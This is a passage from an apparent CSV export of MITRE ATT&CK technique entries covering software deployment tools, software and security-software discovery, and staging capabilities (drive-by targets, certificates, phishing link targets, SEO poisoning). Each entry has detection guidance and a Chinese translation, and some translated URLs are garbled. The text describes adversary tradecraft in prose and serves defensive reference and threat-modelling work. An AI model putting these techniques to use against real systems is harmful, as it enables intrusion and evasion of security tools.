Access to a third-party network-wide or enterprise-wide software system may enable an adversary to have remote code execution on all systems that are connected to such a system. The access may be used to laterally move to other systems, gather information, or cause a specific effect, such as wiping the hard drives on all endpoints.

The permissions required for this action vary by system configuration; local credentials may be sufficient with direct access to the third-party system, or specific domain credentials may be required. However, the system may require an administrative account to log in or to perform it's intended purpose.",https://attack.mitre.org/techniques/T1072,31 May 2017,11 December 2020,2.1,"Execution, Lateral Movement","Detection methods will vary depending on the type of third-party software or system and how it is typically used. 

The same investigation process can be applied here as with other potentially malicious activities where the distribution vector is initially unknown but the resulting activity follows a discernible pattern. Analyze the process execution trees, historical activities from the third-party application (such as what types of files are usually pushed), and the resulting activities or events from the file/binary/script pushed to systems. 

Often these third-party applications will have logs of their own that can be collected and correlated with other data from the environment. Ensure that third-party application logs are on-boarded to the enterprise logging system and the logs are regularly reviewed. Audit software deployment logs and look for suspicious or unauthorized activity. A system not typically used to push software to clients that suddenly is used for such a task outside of a known admin function may be suspicious. Monitor account login activity on these applications to detect suspicious/abnormal usage.

Perform application deployment at regular times so that irregular deployment activity stands out. Monitor process activity that does not correlate to known good software. Monitor account login activity on the deployment system.","Linux, Windows, macOS","Application Log: Application Log Content, Process: Process Creation",False,,,"Shane Tully, @securitygypsy","Administrator, SYSTEM, User",1.0,,CAPEC-187,,,"(Citation: Dell TG-1314),(Citation: Group IB Silence Sept 2018),(Citation: Dell Wiper),(Citation: FireEye APT32 May 2017),",软件部署工具,攻击者可以访问和使用安装在企业网络中的第三方软件套件，例如管理、监控和部署系统，以在网络中横向移动。出于管理目的（例如，SCCM、HBSS、Altiris 等），可能会在网络环境中使用第三方应用程序和软件部署系统。访问第三方网络范围或企业范围的软件系统可能使攻击者能够在连接到此类系统的所有系统上远程执行代码。该访问可用于横向移动到其他系统、收集信息或产生特定效果，例如擦除所有终端上的硬盘驱动器。此操作所需的权限因系统配置而异；本地凭据可能足以直接访问第三方系统，或者可能需要特定的域凭据。但是，系统可能需要管理帐户才能登录或执行其预期目的。
T1518,Software Discovery,"Adversaries may attempt to get a listing of software and software versions that are installed on a system or in a cloud environment. Adversaries may use the information from [Software Discovery](https://attack.mitre.org/techniques/T1518) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.

Adversaries may attempt to enumerate software for a variety of reasons, such as figuring out what security measures are present or if the compromised system has a version of software that is vulnerable to [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068).",https://attack.mitre.org/techniques/T1518,16 September 2019,29 January 2022,1.3,Discovery,"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained.

Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).","Azure AD, Google Workspace, IaaS, Linux, Office 365, SaaS, Windows, macOS","Command: Command Execution, Firewall: Firewall Enumeration, Firewall: Firewall Metadata, Process: OS API Execution, Process: Process Creation",False,,,,"Administrator, User",,,CAPEC-580,,,"(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: trendmicro xcsset xcode project 2020),(Citation: Symantec Inception Framework March 2018),(Citation: Kaspersky Lyceum October 2021),(Citation: FoxIT Wocao December 2019),(Citation: Secureworks GOLD KINGSWOOD September 2018),(Citation: ESET RTM Feb 2017),(Citation: Mandiant UNC3890 Aug 2022),(Citation: Unit 42 Siloscape Jun 2021),(Citation: ATT Sidewinder January 2021),(Citation: Checkpoint Dridex Jan 2021),(Citation: Trend Micro Tick November 2019),(Citation: ESET InvisiMole June 2020),(Citation: ESET InvisiMole June 2018),(Citation: ESET ComRAT May 2020),(Citation: Cybereason Kimsuky November 2020),(Citation: Check Point APT35 CharmPower January 2022),(Citation: Kaspersky Ferocious Kitten Jun 2021),(Citation: ESET Casbaneiro Oct 2019),(Citation: Proofpoint Leviathan Oct 2017),(Citation: Group IB Ransomware September 2020),(Citation: FOX-IT May 2016 Mofang),(Citation: TrendMicro Tropic Trooper May 2020),(Citation: Kaspersky MoleRATs April 2019),(Citation: Cybereason Bazar July 2020),(Citation: FireEye Metamorfo Apr 2018),(Citation: MacKeeper Bundlore Apr 2019),(Citation: Trend Micro Muddy Water March 2021),(Citation: Anomali MUSTANG PANDA October 2019),(Citation: Kaspersky TajMahal April 2019),(Citation: Rewterz Sidewinder APT April 2020),(Citation: ESET ForSSHe December 2018),(Citation: Carbon Black HotCroissant April 2020),(Citation: ANSSI Sandworm January 2021),(Citation: Cylance Dust Storm),(Citation: BlackBerry Bahamut),(Citation: Malwarebytes Dyreza November 2015),(Citation: MalwareBytes SideCopy Dec 2021),",软件发现,攻击者可能会尝试获取安装在系统或云环境中的软件和软件版本的列表。攻击者可以在自动发现期间使用来自 [Software Discovery](https://attack.mitre.org/techniques/T1518) 的信息来塑造后续行为，包括攻击者是否完全感染目标和/或特定尝试行动。攻击者可能会出于各种原因尝试枚举软件，例如找出存在哪些安全措施，或者受感染的系统是否具有易受 [Exploitation for Privilege Escalation] 的软件版本（https://attack.mitre.组织/技术/T1068）。
T1518.001,Software Discovery: Security Software Discovery,"Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on a system or in a cloud environment. This may include things such as firewall rules and anti-virus. Adversaries may use the information from [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.

Example commands that can be used to obtain security software information are [netsh](https://attack.mitre.org/software/S0108), <code>reg query</code> with [Reg](https://attack.mitre.org/software/S0075), <code>dir</code> with [cmd](https://attack.mitre.org/software/S0106), and [Tasklist](https://attack.mitre.org/software/S0057), but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for. It is becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software.

Adversaries may also utilize cloud APIs to discover the configurations of firewall rules within an environment.(Citation: Expel IO Evil in AWS) For example, the permitted IP ranges, ports or user accounts for the inbound/outbound rules of security groups, virtual firewalls established within AWS for EC2 and/or VPC instances, can be revealed by the <code>DescribeSecurityGroups</code> action with various request parameters. (Citation: DescribeSecurityGroups - Amazon Elastic Compute Cloud)",https://attack.mitre.org/techniques/T1518/001,21 February 2020,11 April 2022,1.3,Discovery,"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained.

Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).

In cloud environments, additionally monitor logs for the usage of APIs that may be used to gather information about security software configurations within the environment.","Azure AD, Google Workspace, IaaS, Linux, Office 365, SaaS, Windows, macOS","Command: Command Execution, Firewall: Firewall Enumeration, Firewall: Firewall Metadata, Process: OS API Execution, Process: Process Creation",True,T1518,,"Isif Ibrahima, Mandiant",,,,CAPEC-581,,,"(Citation: ATT TeamTNT Chimaera September 2020),(Citation: Cybereason Valak May 2020),(Citation: Kaspersky Adwind Feb 2016),(Citation: trendmicro xcsset xcode project 2020),(Citation: Cylance Shaheen Nov 2018),(Citation: TrendMicro TropicTrooper 2015),(Citation: Trend Micro Waterbear December 2019),(Citation: Medium Ali Salem Bumblebee April 2022),(Citation: FoxIT Wocao December 2019),(Citation: ATT QakBot April 2021),(Citation: ESET RTM Feb 2017),(Citation: Proofpoint Operation Transparent Tribe March 2016),(Citation: Microsoft Tasklist),(Citation: Trend Micro Tick November 2019),(Citation: Cofense Astaroth Sept 2018),(Citation: FinFisher Citation),(Citation: CrowdStrike AQUATIC PANDA December 2021),(Citation: Kaspersky QakBot September 2021),(Citation: ESET Operation Groundbait),(Citation: Talos Promethium June 2020),(Citation: Securelist Darkhotel Aug 2015),(Citation: TrendMicro Netwalker May 2020),(Citation: Talos Micropsia June 2017),(Citation: Cybereason Bazar July 2020),(Citation: Palo Alto Comnie),(Citation: Fortinet Metamorfo Feb 2020),(Citation: Palo Alto T9000 Feb 2016),(Citation: Unit 42 DarkHydrus July 2018),(Citation: Volexity InkySquid BLUELIGHT August 2021),(Citation: KISA Operation Muzabi),(Citation: Kaspersky TajMahal April 2019),(Citation: FireEye Know Your Enemy FIN8 Aug 2016),(Citation: Security Affairs SILENTTRINITY July 2019),(Citation: Rewterz Sidewinder APT April 2020),(Citation: Crowdstrike Qakbot October 2020),(Citation: Prevailion DarkWatchman 2021),(Citation: FireEye APT34 Dec 2017),(Citation: Kaspersky Transparent Tribe August 2020),(Citation: Unit 42 Tropic Trooper Nov 2016),(Citation: Github PowerShell Empire),(Citation: Cybereason Clop Dec 2020),(Citation: ESET PipeMon May 2020),(Citation: Microsoft Analyzing Solorigate Dec 2020),(Citation: McAfee Gold Dragon),(Citation: FireEye APT28),(Citation: Unit 42 VERMIN Jan 2018),(Citation: Radware Micropsia July 2018),(Citation: Securelist BlackOasis Oct 2017),(Citation: Cymmetria Patchwork),(Citation: TechNet Netsh Firewall),(Citation: BiZone Lizar May 2021),(Citation: F-Secure CozyDuke),(Citation: BlackBerry Amadey 2020),(Citation: Prevx Carberp March 2011),(Citation: ESET Grandoreiro April 2020),(Citation: Proofpoint Bumblebee April 2022),(Citation: Cyphort EvilBunny Dec 2014),(Citation: Microsoft PLATINUM April 2016),(Citation: Baumgartner Naikon 2015),(Citation: Cisco Talos Bitter Bangladesh May 2022),(Citation: FireEye SUNBURST Additional Details Dec 2020),(Citation: Cisco Talos Intelligence Group),(Citation: Checkpoint IndigoZebra July 2021),(Citation: MalwareBytes SideCopy Dec 2021),(Citation: Morphisec ShellTea June 2019),(Citation: Kaspersky ProjectSauron Technical Analysis),(Citation: Kaspersky Flame Functionality),(Citation: ESET Turla Mosquito Jan 2018),(Citation: DFIR Ryuk's Return October 2020),(Citation: Unit 42 BadPatch Oct 2017),(Citation: Secureworks GOLD KINGSWOOD September 2018),(Citation: Talos Rocke August 2018),(Citation: Securelist MuddyWater Oct 2018),(Citation: Unit 42 Rocke January 2019),(Citation: Symantec Bumblebee June 2022),(Citation: Unit 42 WhisperGate January 2022),(Citation: Kaspersky Turla),(Citation: ESET InvisiMole June 2020),(Citation: Proofpoint TA505 Mar 2018),(Citation: ESET ComRAT May 2020),(Citation: Kaspersky Ferocious Kitten Jun 2021),(Citation: FireEye MuddyWater Mar 2018),(Citation: CISA AA20-239A BeagleBoyz August 2020),(Citation: Talos Zeus Panda Nov 2017),(Citation: Unit42 DarkHydrus Jan 2019),(Citation: Prevailion EvilNum May 2020),(Citation: Korean FSI TA505 2020),(Citation: Kaspersky StoneDrill 2017),(Citation: ESET Dukes October 2019),(Citation: Trend Micro Skidmap),(Citation: Cylance Shell Crew Feb 2017),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: Symantec W.32 Stuxnet Dossier),(Citation: TechNet Netsh),(Citation: ESET Gelsemium June 2021),(Citation: Morphisec Cobalt Gang Oct 2018),(Citation: DustySky),(Citation: jRAT Symantec Aug 2018),(Citation: Forcepoint Felismus Mar 2017),(Citation: Microsoft DUBNIUM June 2016),(Citation: Unit42 CookieMiner Jan 2019),(Citation: Talos Frankenstein June 2019),(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: Kaspersky WIRTE November 2021),(Citation: ESET Casbaneiro Oct 2019),(Citation: Mcafee Clop Aug 2019),(Citation: GDATA Zeus Panda June 2017),(Citation: Talos Cobalt Group July 2018),(Citation: Kaspersky Flame),(Citation: Cybereason Molerats Dec 2020),(Citation: Zscaler Kasidet),(Citation: Microsoft SIR Vol 21),(Citation: wardle evilquest parti),(Citation: Check Point Meteor Aug 2021),(Citation: ESET GreyEnergy Oct 2018),(Citation: BlackBerry Bahamut),",软件发现：安全软件发现,攻击者可能会尝试获取安装在系统或云环境中的安全软件、配置、防御工具和传感器的列表。这可能包括防火墙规则和防病毒等内容。攻击者可以在自动发现过程中使用来自 [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001) 的信息来塑造后续行为，包括攻击者是否完全感染目标和/或尝试特定的动作。可用于获取安全软件信息的示例命令是 [netsh](https://attack.mitre.org/software/S0108)、<code>reg query</code> 和 [Reg](https://attack .mitre.org/software/S0075)、<code>dir</code> 和 [cmd](https://attack.mitre.org/software/S0106) 和 [Tasklist](https://attack.mitre .org/software/S0057），但发现行为的其他指标可能更具体到对手正在寻找的软件或安全系统的类型。 macOS 恶意软件对 LittleSnitch 和 KnockKnock 软件进行检查变得越来越普遍。攻击者还可以利用云 API 来发现环境中防火墙规则的配置。（引用：Expel IO Evil in AWS）例如，安全组的入站/出站规则允许的 IP 范围、端口或用户帐户、虚拟防火墙在 AWS 中为 EC2 和/或 VPC 实例建立的，可以通过具有各种请求参数的 <code>DescribeSecurityGroups</code> 操作来显示。 （引用：DescribeSecurityGroups - Amazon Elastic Compute Cloud）
T1608,Stage Capabilities,"Adversaries may upload, install, or otherwise set up capabilities that can be used during targeting. To support their operations, an adversary may need to take capabilities they developed ([Develop Capabilities](https://attack.mitre.org/techniques/T1587)) or obtained ([Obtain Capabilities](https://attack.mitre.org/techniques/T1588)) and stage them on infrastructure under their control. These capabilities may be staged on infrastructure that was previously purchased/rented by the adversary ([Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)) or was otherwise compromised by them ([Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)). Capabilities may also be staged on web services, such as GitHub or Pastebin, or on Platform-as-a-Service (PaaS) offerings that enable users to easily provision applications.(Citation: Volexity Ocean Lotus November 2020)(Citation: Dragos Heroku Watering Hole)(Citation: Malwarebytes Heroku Skimmers)(Citation: Netskope GCP Redirection)(Citation: Netskope Cloud Phishing)

Staging of capabilities can aid the adversary in a number of initial access and post-compromise behaviors, including (but not limited to):

* Staging web resources necessary to conduct [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) when a user browses to a site.(Citation: FireEye CFR Watering Hole 2012)(Citation: Gallagher 2015)(Citation: ATT ScanBox)
* Staging web resources for a link target to be used with spearphishing.(Citation: Malwarebytes Silent Librarian October 2020)(Citation: Proofpoint TA407 September 2019)
* Uploading malware or tools to a location accessible to a victim network to enable [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105).(Citation: Volexity Ocean Lotus November 2020)
* Installing a previously acquired SSL/TLS certificate to use to encrypt command and control traffic (ex: [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002) with [Web Protocols](https://attack.mitre.org/techniques/T1071/001)).(Citation: DigiCert Install SSL Cert)",https://attack.mitre.org/techniques/T1608,17 March 2021,19 October 2022,1.2,Resource Development,"If infrastructure or patterns in malware, tooling, certificates, or malicious web content have been previously identified, internet scanning may uncover when an adversary has staged their capabilities.

Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as initial access and post-compromise behaviors.",PRE,Internet Scan: Response Content,False,,,,,,,,,,"(Citation: Proofpoint TA416 Europe March 2022),",阶段能力/伪装能力/发起攻击,攻击者可能会上传、安装或以其他方式设置可在定位期间使用的功能。为了支持他们的行动，对手可能需要利用他们开发的能力（[Develop Capabilities](https://attack.mitre.org/techniques/T1587)）或获得的能力（[Obtain Capabilities](https://attack.mitre) .org/techniques/T1588)) 并将它们放在他们控制的基础设施上。这些功能可能会在攻击者之前购买/租用的基础设施（[Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)）或以其他方式受到攻击（[Compromise Infrastructure](https ://attack.mitre.org/techniques/T1584））。功能还可以在 Web 服务（例如 GitHub 或 Pastebin）或平台即服务 (PaaS) 产品上上演，使用户能够轻松配置应用程序。（引文：Volexity Ocean Lotus 2020 年 11 月）（引文：Dragos Heroku Watering Hole)(Citation: Malwarebytes Heroku Skimmers)(Citation: Netskope GCP Redirection)(Citation: Netskope Cloud Phishing) 能力分级可以帮助攻击者进行许多初始访问和攻击后行为，包括（但不限于） : * 当用户浏览一个站点时，进行 [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) 所需的网络资源。（引文：FireEye CFR Watering Hole 2012）（引文：Gallagher 2015 年）（引文：ATT ScanBox）* 为用于鱼叉式网络钓鱼的链接目标准备 Web 资源。（引文：Malwarebytes Silent Librarian 2020 年 10 月）（引文：Proofpoint TA407 2019 年 9 月）* 将恶意软件或工具上传到可访问的位置受害者网络启用 [Ingr ess Tool Transfer](https://attack.mitre.org/techniques/T1105).(Citation: Volexity Ocean Lotus November 2020) * 安装先前获得的 SSL/TLS 证书以用于加密命令和控制流量（例如：[非对称密码学](https://attack.mitre.org/techniques/T1573/002) 与 [Web 协议](https://attack.mitre.org/techniques/T1071/001))。（引用：DigiCert 安装 SSL证书）
T1608.004,Stage Capabilities: Drive-by Target,"Adversaries may prepare an operational environment to infect systems that visit a website over the normal course of browsing. Endpoint systems may be compromised through browsing to adversary controlled sites, as in [Drive-by Compromise](https://attack.mitre.org/techniques/T1189). In such cases, the user's web browser is typically targeted for exploitation (often not requiring any extra user interaction once landing on the site), but adversaries may also set up websites for non-exploitation behavior such as [Application Access Token](https://attack.mitre.org/techniques/T1550/001). Prior to [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), adversaries must stage resources needed to deliver that exploit to users who browse to an adversary controlled site. Drive-by content can be staged on adversary controlled infrastructure that has been acquired ([Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)) or previously compromised ([Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)).

Adversaries may upload or inject malicious web content, such as [JavaScript](https://attack.mitre.org/techniques/T1059/007), into websites.(Citation: FireEye CFR Watering Hole 2012)(Citation: Gallagher 2015) This may be done in a number of ways, including inserting malicious script into web pages or other user controllable web content such as forum posts. Adversaries may also craft malicious web advertisements and purchase ad space on a website through legitimate ad providers. In addition to staging content to exploit a user's web browser, adversaries may also stage scripting content to profile the user's browser (as in [Gather Victim Host Information](https://attack.mitre.org/techniques/T1592)) to ensure it is vulnerable prior to attempting exploitation.(Citation: ATT ScanBox)

Websites compromised by an adversary and used to stage a drive-by may be ones visited by a specific community, such as government, a particular industry, or region, where the goal is to compromise a specific user or set of users based on a shared interest. This kind of targeted campaign is referred to a strategic web compromise or watering hole attack.

Adversaries may purchase domains similar to legitimate domains (ex: homoglyphs, typosquatting, different top-level domain, etc.) during acquisition of infrastructure ([Domains](https://attack.mitre.org/techniques/T1583/001)) to help facilitate [Drive-by Compromise](https://attack.mitre.org/techniques/T1189).",https://attack.mitre.org/techniques/T1608/004,17 March 2021,08 March 2022,1.2,Resource Development,"If infrastructure or patterns in the malicious web content utilized to deliver a [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) have been previously identified, internet scanning may uncover when an adversary has staged web content for use in a strategic web compromise.

Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on other phases of the adversary lifecycle, such as [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) or [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203).",PRE,Internet Scan: Response Content,True,T1608,,,,,,,,,"(Citation: Proofpoint Operation Transparent Tribe March 2016),(Citation: Volexity Ocean Lotus November 2020),(Citation: Unit 42 ProjectM March 2016),(Citation: Talos Transparent Tribe May 2021),(Citation: Gigamon Berserk Bear October 2021),(Citation: Gallagher 2015),(Citation: Mandiant UNC3890 Aug 2022),",阶段能力/伪装能力/发起攻击：路过攻击站点,攻击者可能会准备一个操作环境来感染在正常浏览过程中访问网站的系统。终端系统可能会通过浏览对手控制的站点而受到损害，如 [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)。在这种情况下，用户的 Web 浏览器通常会成为攻击的目标（登陆网站后通常不需要任何额外的用户交互），但攻击者也可能会为非利用行为设置网站，例如 [Application Access Token](https: //attack.mitre.org/techniques/T1550/001）。在 [Drive-by Compromise] (https://attack.mitre.org/techniques/T1189) 之前，攻击者必须提供所需的资源，以便向浏览到攻击者控制站点的用户提供该漏洞利用。 Drive-by 内容可以在已经获得（[Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)）或之前被攻陷（[Compromise Infrastructure](https://attack) 的攻击者控制的基础设施上上演.mitre.org/techniques/T1584))。攻击者可能会向网站上传或注入恶意 Web 内容，例如 [JavaScript](https://attack.mitre.org/techniques/T1059/007)。（引用：FireEye CFR Watering Hole 2012）（引用：Gallagher 2015）这可以通过多种方式完成，包括将恶意脚本插入网页或其他用户可控制的网页内容，例如论坛帖子。攻击者还可能通过合法的广告提供商制作恶意网络广告并在网站上购买广告空间。除了登台内容以利用用户的 Web 浏览器，攻击者还可以登台脚本内容来分析用户的浏览器（如 [收集受害者主机信息](https://attack.mitre.org/techniques/T1592)）以确保它在尝试利用之前很容易受到攻击。（引文：ATT ScanBox）被攻击者入侵并用于进行偷渡的网站可能是特定社区访问的网站，例如政府、特定行业或地区，其目标是基于共同利益妥协特定用户或一组用户。这种有针对性的活动被称为战略网络妥协或水坑攻击。攻击者在获取基础设施（[域](https://attack.mitre.org/techniques/T1583/001)）期间可能会购买与合法域相似的域（例如：同形字、仿冒域名、不同的顶级域等）帮助促进 [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)。
T1608.003,Stage Capabilities: Install Digital Certificate,"Adversaries may install SSL/TLS certificates that can be used during targeting. SSL/TLS certificates are files that can be installed on servers to enable secure communications between systems. Digital certificates include information about the key, information about its owner's identity, and the digital signature of an entity that has verified the certificate's contents are correct. If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate securely with its owner. Certificates can be uploaded to a server, then the server can be configured to use the certificate to enable encrypted communication with it.(Citation: DigiCert Install SSL Cert)

Adversaries may install SSL/TLS certificates that can be used to further their operations, such as encrypting C2 traffic (ex: [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002) with [Web Protocols](https://attack.mitre.org/techniques/T1071/001)) or lending credibility to a credential harvesting site. Installation of digital certificates may take place for a number of server types, including web servers and email servers. 

Adversaries can obtain digital certificates (see [Digital Certificates](https://attack.mitre.org/techniques/T1588/004)) or create self-signed certificates (see [Digital Certificates](https://attack.mitre.org/techniques/T1587/003)). Digital certificates can then be installed on adversary controlled infrastructure that may have been acquired ([Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)) or previously compromised ([Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)).",https://attack.mitre.org/techniques/T1608/003,17 March 2021,16 October 2021,1.1,Resource Development,"Consider use of services that may aid in the tracking of certificates in use on sites across the Internet. In some cases it may be possible to pivot on known pieces of certificate information to uncover other adversary infrastructure.(Citation: Splunk Kovar Certificates 2017)

Detection efforts may be focused on related behaviors, such as [Web Protocols](https://attack.mitre.org/techniques/T1071/001) or [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002).",PRE,Internet Scan: Response Content,True,T1608,,,,,,,,,",",阶段能力/伪装能力/发起攻击：安装数字证书,攻击者可能会安装可在定位期间使用的 SSL/TLS 证书。 SSL/TLS 证书是可以安装在服务器上以启用系统之间安全通信的文件。数字证书包括有关密钥的信息、有关其所有者身份的信息以及已验证证书内容正确的实体的数字签名。如果签名是有效的，并且检查证书的人信任签名者，那么他们知道他们可以使用该密钥与其所有者进行安全通信。可以将证书上传到服务器，然后可以将服务器配置为使用该证书来启用与它的加密通信。（引文：DigiCert Install SSL Cert）攻击者可能会安装 SSL/TLS 证书，这些证书可用于进一步他们的操作，例如使用 [Web 协议](https://attack.mitre.org/techniques/T1071/001) 加密 C2 流量（例如：[Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002) ) 或向凭证收集站点提供可信度。可以为多种服务器类型安装数字证书，包括 Web 服务器和电子邮件服务器。攻击者可以获得数字证书（参见[数字证书](https://attack.mitre.org/techniques/T1588/004)）或创建自签名证书（参见[数字证书](https://attack.mitre.组织/技术/T1587/003))。然后可以将数字证书安装在可能已经获得（[Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)）或以前被破坏（[Compromise Infrastructure](https://attack) 的攻击者控制的基础设施上.mitre.org/techniques/T1584))。
T1608.005,Stage Capabilities: Link Target,"Adversaries may put in place resources that are referenced by a link that can be used during targeting. An adversary may rely upon a user clicking a malicious link in order to divulge information (including credentials) or to gain execution, as in [Malicious Link](https://attack.mitre.org/techniques/T1204/001). Links can be used for spearphishing, such as sending an email accompanied by social engineering text to coax the user to actively click or copy and paste a URL into a browser. Prior to a phish for information (as in [Spearphishing Link](https://attack.mitre.org/techniques/T1598/003)) or a phish to gain initial access to a system (as in [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002)), an adversary must set up the resources for a link target for the spearphishing link. 

Typically, the resources for a link target will be an HTML page that may include some client-side script such as [JavaScript](https://attack.mitre.org/techniques/T1059/007) to decide what content to serve to the user. Adversaries may clone legitimate sites to serve as the link target, this can include cloning of login pages of legitimate web services or organization login pages in an effort to harvest credentials during [Spearphishing Link](https://attack.mitre.org/techniques/T1598/003).(Citation: Malwarebytes Silent Librarian October 2020)(Citation: Proofpoint TA407 September 2019) Adversaries may also [Upload Malware](https://attack.mitre.org/techniques/T1608/001) and have the link target point to malware for download/execution by the user.

Adversaries may purchase domains similar to legitimate domains (ex: homoglyphs, typosquatting, different top-level domain, etc.) during acquisition of infrastructure ([Domains](https://attack.mitre.org/techniques/T1583/001)) to help facilitate [Malicious Link](https://attack.mitre.org/techniques/T1204/001). Link shortening services can also be employed. Adversaries may also use free or paid accounts on Platform-as-a-Service providers to host link targets while taking advantage of the widely trusted domains of those providers to avoid being blocked.(Citation: Netskope GCP Redirection)(Citation: Netskope Cloud Phishing)(Citation: Intezer App Service Phishing)",https://attack.mitre.org/techniques/T1608/005,17 March 2021,20 October 2022,1.2,Resource Development,"If infrastructure or patterns in malicious web content have been previously identified, internet scanning may uncover when an adversary has staged web content to make it accessible for targeting.

Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on other phases of the adversary lifecycle, such as during [Spearphishing Link](https://attack.mitre.org/techniques/T1598/003), [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002), or [Malicious Link](https://attack.mitre.org/techniques/T1204/001).",PRE,Internet Scan: Response Content,True,T1608,,,,,,,,,"(Citation: Proofpoint TA407 September 2019),(Citation: Secureworks COBALT DICKENS September 2019),(Citation: Malwarebytes Silent Librarian October 2020),",阶段能力/伪装能力/发起攻击：链接目标,攻击者可能会放置可在定位期间使用的链接引用的资源。攻击者可能会依赖用户单击恶意链接来泄露信息（包括凭据）或获得执行，如 [Malicious Link](https://attack.mitre.org/techniques/T1204/001)。链接可用于鱼叉式网络钓鱼，例如发送带有社交工程文本的电子邮件，以诱使用户主动单击或复制 URL 并将其粘贴到浏览器中。在网络钓鱼之前获取信息（如 [Spearphishing Link](https://attack.mitre.org/techniques/T1598/003)）或网络钓鱼以获得对系统的初始访问权限（如 [Spearphishing Link](https ://attack.mitre.org/techniques/T1566/002))，攻击者必须为鱼叉式钓鱼链接的链接目标设置资源。通常，链接目标的资源将是一个 HTML 页面，其中可能包含一些客户端脚本，例如 [JavaScript](https://attack.mitre.org/techniques/T1059/007)，以决定向哪些内容提供服务用户。攻击者可能克隆合法网站作为链接目标，这可能包括克隆合法 Web 服务的登录页面或组织登录页面，以在 [Spearphishing Link](https://attack.mitre.org/techniques) 期间获取凭据/T1598/003）。（引用：Malwarebytes Silent Librarian October 2020）（引用：Proofpoint TA407 September 2019）攻击者也可以[上传恶意软件]（https://attack.mitre.org/techniques/T1608/001）并拥有链接目标指向恶意软件以供用户下载/执行。攻击者在获取基础设施（[域](https://attack.mitre.org/techniques/T1583/001)）期间可能会购买与合法域相似的域（例如：同形字、仿冒域名、不同的顶级域等）帮助促进 [恶意链接](https://attack.mitre.org/techniques/T1204/001)。也可以使用链接缩短服务。攻击者还可以使用平台即服务提供商上的免费或付费帐户来托管链接目标，同时利用这些提供商的广泛信任域来避免被阻止。（引用：Netskope GCP 重定向）（引用：Netskope Cloud Phishing )（引用：Intezer App Service 网络钓鱼）
T1608.006,Stage Capabilities: SEO Poisoning,"Adversaries may poison mechanisms that influence search engine optimization (SEO) to further lure staged capabilities towards potential victims. Search engines typically display results to users based on purchased ads as well as the site’s ranking/score/reputation calculated by their web crawlers and algorithms.(Citation: Atlas SEO)(Citation: MalwareBytes SEO)

To help facilitate [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), adversaries may stage content that explicitly manipulates SEO rankings in order to promote sites hosting their malicious payloads (such as [Drive-by Target](https://attack.mitre.org/techniques/T1608/004)) within search engines. Poisoning SEO rankings may involve various tricks, such as stuffing keywords (including in the form of hidden text) into compromised sites. These keywords could be related to the interests/browsing habits of the intended victim(s) as well as more broad, seasonably popular topics (e.g. elections, trending news).(Citation: ZScaler SEO)(Citation: Atlas SEO)

Adversaries may also purchase or plant incoming links to staged capabilities in order to boost the site’s calculated relevance and reputation.(Citation: MalwareBytes SEO)(Citation: DFIR Report Gootloader)

